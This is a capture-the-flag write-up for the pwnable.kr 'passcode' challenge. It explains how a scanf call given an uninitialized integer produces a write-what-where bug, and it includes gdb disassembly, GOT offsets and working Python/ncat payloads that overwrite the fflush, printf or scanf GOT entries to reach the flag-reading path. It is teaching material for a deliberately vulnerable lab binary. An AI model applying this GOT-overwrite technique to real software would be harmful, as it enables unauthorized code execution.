# passcode
**Tier**: toddlers-bottle  
**Points:** 20pts  
**Vulnerability:** [CWE-123: Write-what-where Condition](https://cwe.mitre.org/data/definitions/123.html)  
**Concepts:** Uninitialized Values, Arbitrary Write  
**Date:** 2026-11-19

> Mommy told me to make a passcode based login system.  
> My first trial C implementation compiled without any error!  
> Well, there were some compiler warnings, but who cares about that?  
> [passcode - pwnable.kr](https://pwnable.kr/play/16)

## 1. Recon

### 1.1. Source code analysis

The source code (`passcode.c`) contains a vulnerability which allows us to write
to any memory address we want.

```c 
int main(){
    // ...
    welcome();
    login();
    // ...
}
```

For starters, here's a simplified version of the `main` function. As seen above,
it invokes two functions: `welcome`, followed by `login`.

```c
void welcome(){
	char name[100];
    // ...
	scanf("%100s", name);
    // ...
}
```

Here's the `welcome` function, stripped away of irrelevant details. The 
`welcome` function allocates a 100-byte buffer on the stack, followed by a 
`scanf` with the format specifier `%100s`. This means that the `scanf` reads
100 bytes of input and stores it to the buffer. However, since `scanf` 
automatically appends a null terminator `\0` at the end of its input, this
causes a 1-byte overflow, with the null terminator spilling over to the 101st 
byte. In total, the `scanf` here writes up to 101 bytes, although this is 
irrelevant to the exploit.

```c 
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

    // ...

	if (passcode1 == 338150 && passcode2 == 13371337) {
        // pass
        setregid(getegid(), getegid());
        system("/bin/cat flag");
    } else {
        // fail
        exit(0);
    }
}
```

Following the `welcome` function, the `login` function allocates two integers
on the stack and passes its literal value to `scanf`. Notice the way it passes
the `passcode1` variable as a value rather than a reference. This triggers a 
`-Wformat` warning, which is hinted by the description of the challenge.

### 1.2. Vulnerability details

```c 
// example of how scanf works

// my_var is an integer with a hexadecimal value
// which can be interpreted as a memory address
int my_var = 0xffff1234;

// correct; writes a decimal to my_var's memory address
scanf("%d", &my_var);

// incorrect; writes a decimal to my_var's value, hence interpreting
// its value as a memory address
scanf("%d", my_var);

// which essentially translates to
scanf("%d", 0xffff1234);
```

The example above explains why the `login` function's usage of `scanf` is a 
critical vulnerability. As mentioned, `scanf` writes input to the memory address 
supplied in the second argument, which can be an integer value interpreted as a 
memory address[^w3-c-memory-address]. 

Moreover, the `passcode1` variable in the `login` function is not initialized 
with any value, meaning it picks up garbage value as its initial value. In C,
the bytes stored in memory addresses after a function returns aren't zeroed out,
which is why functions like `explicit_bzero` exist[^glibc-5-11]. What this means
for this exploit is that we can align the bytes leftover by the 100-byte buffer
from the `welcome` function, so that `passcode1` from the `login` function picks
it up as its initial value.

We know that an overlap exists between these two variables because they belong
to different functions. For each function, the program stores local variables in
negative offsets relative to the base pointer[^uvcs-asm].

Another relevant topic in this exploit is the Global Offset Table (GOT). 
Essentially, the GOT is a lookup table which stores absolute addresses to 
functions invoked by the program[^linux-foundation-got]. It translates function 
identifiers into memory addresses, similar to how a DNS server translates a 
domain to an IP address.

```bash
$ checksec file passcode
  _____ _    _ ______ _____ _  __ _____ ______ _____
 / ____| |  | |  ____/ ____| |/ // ____|  ____/ ____|
| |    | |__| | |__ | |    | ' /| (___ | |__ | |
| |    |  __  |  __|| |    |  <  \___ \|  __|| |
| |____| |  | | |___| |____| . \ ____) | |___| |____
 \_____|_|  |_|______\_____|_|\_\_____/|______\_____|

RELRO          Stack Canary  ...
Partial RELRO  Canary Found  ...
```

Finally, to verify whether our exploit path is plausible, we consult `checksec`
to check the Relocation Read-Only flag (RELRO). If the binary has been compiled
with Full RELRO, its GOT is set to read-only. If it has instead been compiled 
with Partial RELRO, only the non-PLT part of the GOT is set to read-only, while
the rest remains writable. In both cases, RELRO reorders internal data sections
to prevent the GOT from being overwritten through buffer 
overflows[^redhat-relro].

Since the binary only has Partial RELRO, our GOT overwrite is a valid path if 
we target functions marked with `@plt`. If this were set to Full RELRO, this 
exploit path would be blocked since we wouldn't be able to overwrite the table.

### 1.3. Exploit outline

In Common Weakness Enumeration (CWE), this vulnerability is known as a 
Write-what-where condition, which is any condition where the attacker is able
to write an arbitrary value to an arbitrary location[^cwe-123].

The main idea in this exploit is to:
1. Find the overlap between the 100-byte buffer from `welcome` and the `passcode1`
   variable from `login`.  
2. Store the GOT address of the subsequent function call 
   (i.e. `fflush`) in the aforementioned overlap.
3. Write the address of the success path so the program redirects and skips the
   conditional statement in the `login` function.

## 2. Exploit

### 2.1. Finding the overlap

As outlined in the previous section, we first look for the overlap between the
100-byte buffer `name` and the `passcode1` variable.

```asm 
Breakpoint 1, 0x08049324 in welcome ()
(gdb) disas
Dump of assembler code for function welcome:
   ...
   0x0804931e <+44>:	add    $0x10,%esp
   0x08049321 <+47>:	sub    $0x8,%esp
=> 0x08049324 <+50>:	lea    -0x70(%ebp),%eax
   0x08049327 <+53>:	push   %eax
   0x08049328 <+54>:	lea    -0x1f8b(%ebx),%eax
   0x0804932e <+60>:	push   %eax
   0x0804932f <+61>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x08049334 <+66>:	add    $0x10,%esp
   ...
```

In the debugger, we disassemble the `welcome` function and take note of the 
`lea` instruction before the `scanf` call. With this, we now know that the
100-byte buffer `name` starts at `$ebp - 0x70`. Since it is 100 bytes long, we 
infer that its buffer runs from `$ebp - 0x70` to `$ebp - 0xc`.

```asm
Breakpoint 2, 0x0804921e in login ()
(gdb) disas
Dump of assembler code for function login:
   ...
   0x0804921b <+37>:	sub    $0x8,%esp
=> 0x0804921e <+40>:	push   -0x10(%ebp)
   0x08049221 <+43>:	lea    -0x1fe5(%ebx),%eax
   0x08049227 <+49>:	push   %eax
   0x08049228 <+50>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:	add    $0x10,%esp
   0x08049230 <+58>:	mov    -0x4(%ebx),%eax
   0x08049236 <+64>:	mov    (%eax),%eax
   0x08049238 <+66>:	sub    $0xc,%esp
   0x0804923b <+69>:	push   %eax
   0x0804923c <+70>:	call   0x8049060 <fflush@plt>
   ...
```

We do the same for the `login` function, but we look for the `push` instruction
before the `scanf` call since we're dealing with an integer rather than an 
array. Hence, we note that `passcode1` is stored at `$ebp - 0x10`.

```
Offset        welcome()               login()
------------------------------------------------
...         | canary, etc.          | ...            
ebp - 0xd   | name[99] (byte 100)   | \
ebp - 0xe   | name[98] (byte 99)    |  | passcode1
ebp - 0xf   | name[97] (byte 98)    |  | 4 bytes
ebp - 0x10  | name[96] (byte 97)    | /
...         | ...                   | ...
ebp - 0x70  | name[0] (byte 1)      | ...
```

To understand better, the table above presents the overlap between the two
variables allocated on the stack. As such, we now know that we must store the
target GOT address at the last 4 bytes of our 100-byte buffer,
ranging from addresses `$ebp - 0x10` to `$ebp - 0xd`.

### 2.2. Picking a GOT entry to hijack

```c
    ...
	scanf("%d", passcode1);
	fflush(stdin);

    printf("enter passcode2 : ");
    scanf("%d", passcode2);
    ...
```

Going back to the `login` function, we see that `fflush` is the function called
right after the `scanf` finishes execution, followed by `printf` and another 
`scanf`. Because `passcode2` is pointing to garbage data, it is highly likely 
that this will cause a segmentation fault when executed. That said, any 
function called before the second `scanf` can be hijacked to divert control 
flow before the program runs into a segmentation fault. As such, we can pick 
either `fflush`, `printf`, or `scanf`.

```bash 
$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
0804c010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804c030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
...
```

Now that we have our options, we take a look at their GOT 
addresses through `objdump -R passcode`. Above is the filtered result to avoid
visual clutter. We can use any of the offset addresses here, but for the 
sake of simplicity, we'll be using the `fflush` function (`0x0804c014`).

### 2.3. Crafting the payload

```
Offset        welcome()               login()         payload
--------------------------------------------------------------
...         | canary, etc.          | ...           | ...
ebp - 0xd   | name[99] (byte 100)   | \             | 0x14
ebp - 0xe   | name[98] (byte 99)    |  | passcode1  | 0xc0
ebp - 0xf   | name[97] (byte 98)    |  | 4 bytes    | 0x04
ebp - 0x10  | name[96] (byte 97)    | /             | 0x08
ebp - 0x11  | name[95] (byte 96)    | ...           | A
...         | ...                   | ...           | ...
ebp - 0x6f  | name[1] (byte 2)      | ...           | A
ebp - 0x70  | name[0] (byte 1)      | ...           | A
```
Now, we craft our payload. As shown earlier in the offset table, the overlap 
occurs at bytes 97 to 100, therefore the last 4 bytes of our buffer should be
the Global Offset Address of our chosen function (`fflush` in this case). The
other 96 bytes will simply be for padding.

Recall that this vulnerability is known as a Write-what-where condition. With
this payload, we now have the "Where" part, which is the location we want to 
write to (the GOT entry of `fflush`). To establish the "What",
or in simpler terms, the value we want to write to the chosen location, we look
for the instruction address of our success path.

```c
    // ...
	if(passcode1==338150 && passcode2==13371337){
        printf("Login OK!\n");
        setregid(getegid(), getegid()); // our target line
        system("/bin/cat flag");
    }
    // ...
```

```asm 
(gdb) disas
Dump of assembler code for function login:
   ...
=> 0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    %eax,%esi
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    $0x8,%esp
   0x080492b0 <+186>:	push   %esi
   0x080492b1 <+187>:	push   %eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    $0x10,%esp
   0x080492ba <+196>:	sub    $0xc,%esp
   0x080492bd <+199>:	lea    -0x1fb9(%ebx),%eax
   0x080492c3 <+205>:	push   %eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
   0x080492c9 <+211>:	add    $0x10,%esp
   ...
End of assembler dump.
```

From the disassembled instructions, we select the first instance of the 
`getegid` function, as it sets the stage for our `system` call. The memory
address `0x080492a1` is the "What" part of our Write-what-where condition.

However, notice how the `scanf` specifies the format `%d`. This means that it
only accepts decimals and not hexadecimals. Therefore, we convert the value
`0x080492a1` to its base 10 equivalent, which is `134517409`.

With this, we now craft our payload in python:
```python 
import sys

sys.stdout.buffer.write(
    b"A" * 96 +             # 96 padding bytes
    b"\x14\xc0\x04\x08" +   # the "Where"; target address; fflush GOT
    b"\n" +                 # newline to end the first input string
    b"134517409" +          # the "What"; value to write; address in base 10
    b"\n"                   # another newline to end the input
)
```

Finally, we capture the flag by piping it to the binary:
```bash 
$ python -c '
    import sys
    sys.stdout.buffer.write(b"A" * 96 + b"\x14\xc0\x04\x08" + b"\n134517409\n")
' | ncat pwnable.kr 10004

Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
[FLAG]
enter passcode1 : Now I can safely trust you that you have credential :)
```

### 2.4. Alternative GOT entries

As mentioned in section 2.2., we can hijack any of the functions before the 
second `scanf` executes properly. In the previous section, we hijacked the 
`fflush` function. The following payloads exploit the same vulnerability, but
use the GOT entries for `printf` and `scanf` respectively.

For `printf`:
```bash 
$ python -c '
    import sys
    sys.stdout.buffer.write(b"A" * 96 + b"\x10\xc0\x04\x08" + b"\n134517409\n")
' | ncat pwnable.kr 10004
```

For `scanf`:
```bash 
$ python -c '
    import sys
    sys.stdout.buffer.write(b"A" * 96 + b"\x30\xc0\x04\x08" + b"\n134517409\n")
' | ncat pwnable.kr 10004
```

All of the payloads shown work the same, with the only difference being the
hijacked function executing at different points of the program.

## 3. References

[^cwe-123]: [Common Weakness Enumeration - CWE-123: Write-what-where Condition](https://cwe.mitre.org/data/definitions/123.html)  
[^glibc-5-11]: [The GNU C Library Reference Manual - Section 5.11: Erasing Sensitive Data](https://sourceware.org/glibc/manual/latest/pdf/libc.pdf#Erasing%20Sensitive%20Data)  
[^linux-foundation-got]: [Linux Foundation - zSeries ELF Application Binary Interface Supplement: Program loading and dynamic linking](https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html)  
[^redhat-relro]: [RedHat - Hardening ELF binaries using Relocation Read-Only](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)  
[^uvcs-asm]: [University of Virginia Computer Science - CS216 x86 Assembly Guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)  
[^w3-c-memory-address]: [W3Schools - C Memory Address](https://www.w3schools.com/c/c_memory_address.php)  

